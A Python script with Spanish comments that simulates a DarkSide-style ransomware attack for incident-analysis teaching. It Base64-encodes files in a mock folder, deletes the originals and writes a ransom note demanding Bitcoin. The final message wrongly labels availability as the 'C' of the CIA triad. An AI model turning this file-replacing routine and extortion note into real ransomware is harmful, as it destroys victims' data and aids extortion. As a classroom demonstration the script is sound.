import os
import base64
from datetime import datetime

# -------------------------------------------------------------------------
# AVISO EDUCACIONAL: Este script es una simulación controlada para 
# el análisis de incidentes de ciberseguridad. NO cifra archivos reales 
# con algoritmos irreversibles. Solo realiza una codificación Base64 
# para demostrar el concepto de "pérdida de disponibilidad".
# -------------------------------------------------------------------------

class RansomwareSimulator:
    def __init__(self, target_dir):
        self.target_dir = target_dir
        self.extension = ".darkside_encrypted"
        self.ransom_note_name = "README_TO_RECOVER_FILES.txt"

    def generate_ransom_note(self):
        """Genera una nota de rescate similar a la de Colonial Pipeline."""
        note_content = f"""
        -------------------------------------------------------------
        !!! YOUR NETWORK HAS BEEN COMPROMISED BY DARKSIDE !!!
        -------------------------------------------------------------
        
        All your important files have been encrypted.
        Your data is stored on our private leak server. 
        If you don't pay, we will publish your 100GB of stolen data.
        
        WHAT HAPPENED?
        We hacked your IT network and gained administrative access.
        
        HOW TO RECOVER?
        1. Download Tor Browser.
        2. Visit our onion link.
        3. Pay $4.4 Million in Bitcoin.
        
        DATE OF ATTACK: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        -------------------------------------------------------------
        """
        with open(os.path.join(self.target_dir, self.ransom_note_name), "w") as f:
            f.write(note_content)
        print(f"[!] Nota de rescate generada en: {self.target_dir}")

    def simulate_encryption(self):
        """Simula el cifrado de archivos de texto en el directorio."""
        print(f"[*] Iniciando cifrado simulado en: {self.target_dir}...")
        
        for filename in os.listdir(self.target_dir):
            # No cifrar la nota de rescate ni el propio script
            if filename == self.ransom_note_name or filename.endswith(".py"):
                continue
            
            file_path = os.path.join(self.target_dir, filename)
            
            if os.path.isfile(file_path):
                try:
                    # Leer contenido original
                    with open(file_path, "rb") as f:
                        data = f.read()
                    
                    # Simular cifrado usando Base64 (reversible para la demo)
                    encoded_data = base64.b64encode(data)
                    
                    # Sobrescribir y cambiar extensión
                    new_file_path = file_path + self.extension
                    with open(new_file_path, "wb") as f:
                        f.write(encoded_data)
                    
                    # Eliminar el original (comportamiento típico de ransomware)
                    os.remove(file_path)
                    print(f"[+] Archivo comprometido: {filename} -> {filename}{self.extension}")
                except Exception as e:
                    print(f"[X] Error procesando {filename}: {e}")

if __name__ == "__main__":
    # Creamos un directorio temporal de prueba para la simulación
    test_folder = "mock_it_system"
    if not os.path.exists(test_folder):
        os.makedirs(test_folder)
        # Crear archivos de "datos" falsos
        with open(os.path.join(test_folder, "facturacion_q1.csv"), "w") as f:
            f.write("id,cliente,monto\n1,Gasolinera_A,50000\n2,Transportes_B,120000")
        with open(os.path.join(test_folder, "plan_estrategico.docx"), "w") as f:
            f.write("Información confidencial sobre el oleoducto de la Costa Este.")

    # Ejecutar simulador
    virus = RansomwareSimulator(test_folder)
    virus.simulate_encryption()
    virus.generate_ransom_note()
    
    print("\n--- ANALISIS TECNICO FINALIZADO ---")
    print("El sistema ahora presenta pérdida de Disponibilidad (C de la tríada CIA).")